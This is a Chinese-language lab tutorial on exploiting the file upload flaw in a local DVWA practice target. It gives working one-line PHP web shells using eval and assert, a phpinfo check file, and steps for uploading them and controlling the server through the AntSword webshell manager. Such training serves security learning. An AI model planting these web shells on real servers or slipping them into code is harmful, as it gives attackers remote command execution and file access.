# 文件上传核心实操：一句话木马 + phpinfo + 蚁剑连接

## 一、前置准备（必做）

### 1. 环境确认

- 确保DVWA靶场正常运行（安全等级设为Low），访问地址：`http://localhost:8080`（账号`admin`/`password`）。

- 蚁剑（AntSword）已安装并能正常打开（无需提前配置，连接时再设置）。

- 本地文本编辑器（如Notepad++、VS Code）：用于编写PHP文件。

### 2. 核心原理回顾

- **一句话木马**：通过短小的PHP代码，让服务器执行我们传入的任意PHP命令，核心是`eval()`/`assert()`函数。

- **phpinfo()**：PHP内置函数，用于输出服务器的PHP环境信息，上传后访问可验证“文件是否被解析为PHP脚本”。

- **蚁剑**：通过POST请求向一句话木马传递命令，实现可视化操控服务器文件/命令执行。

## 二、Step 1：编写并上传PHP文件（含一句话木马/ phpinfo）

### 1. 编写文件

#### （1）一句话木马文件（命名：`shell.php`）

```PHP

<?php
// 核心一句话木马：接收POST参数「cmd」，并将其作为PHP代码执行
// @ 符号用于抑制错误信息，更隐蔽；eval()是执行代码的核心函数
@eval($_POST['cmd']); 
?>
```

**拓展写法（备用，应对不同环境）**：

```PHP

<?php
// assert()函数在部分PHP版本中可替代eval()
assert($_POST['pass']); 
?>
```

#### （2）phpinfo测试文件（命名：`phpinfo.php`）

```PHP

<?php
// 输出PHP环境信息，验证文件是否被服务器解析
phpinfo();
?>
```

### 2. 上传文件（DVWA Low难度）

1. 登录DVWA，点击左侧「File Upload」模块，进入文件上传页面。

2. 点击「Choose File」，选择编写好的`shell.php`（或`phpinfo.php`）。

3. 点击「Upload」按钮，页面会提示上传成功，并返回文件路径（关键！）：

    - 示例路径：`http://localhost:8080/hackable/uploads/shell.php`。

4. 重复步骤上传`phpinfo.php`，记录其路径。

### 3. 验证上传结果

- 访问`phpinfo.php`的路径（如`http://localhost:8080/hackable/uploads/phpinfo.php`）：

    - 若页面显示PHP版本、服务器信息等，说明文件被正常解析，上传漏洞存在；

    - 若仅显示代码文本，说明服务器未解析PHP，需检查环境/靶场配置。

## 三、Step 2：蚁剑连接一句话木马（核心实操）

### 1. 蚁剑基础配置

1. 打开蚁剑，点击左上角「添加」按钮（+号），弹出配置窗口。

2. 填写核心参数（**必须与木马代码匹配**）：

|    参数名|    填写内容（示例）|    说明|
|---|---|---|
|    地址（URL）|    [http://localhost:8080/hackable/uploads/shell.php](http://localhost:8080/hackable/uploads/shell.php)|    上传后的木马文件路径|
|    连接密码|    cmd|    与木马中`$_POST['cmd']`一致|

|    脚本语言|    PHP|    匹配木马的脚本类型|

### 2. 蚁剑使用（基础操作）

1. 连接成功后，双击站点进入文件管理界面：

    - 可查看服务器文件目录（如`/var/www/html/`）；

    - 右键文件可执行「下载/上传/删除」等操作；

2. 点击顶部「虚拟终端」，可执行系统命令（如`whoami`、`ls`），验证服务器权限。

### 总结

1. **核心匹配**：蚁剑的「连接密码」必须与一句话木马中`$_POST[]`的参数完全一致（如木马用`pass`，蚁剑就填`pass`）。

2. **路径关键**：上传后务必记录文件的完整URL路径，这是蚁剑连接的核心。

3. **验证优先**：先上传`phpinfo.php`验证PHP解析环境，再上传一句话木马，降低排查难度。
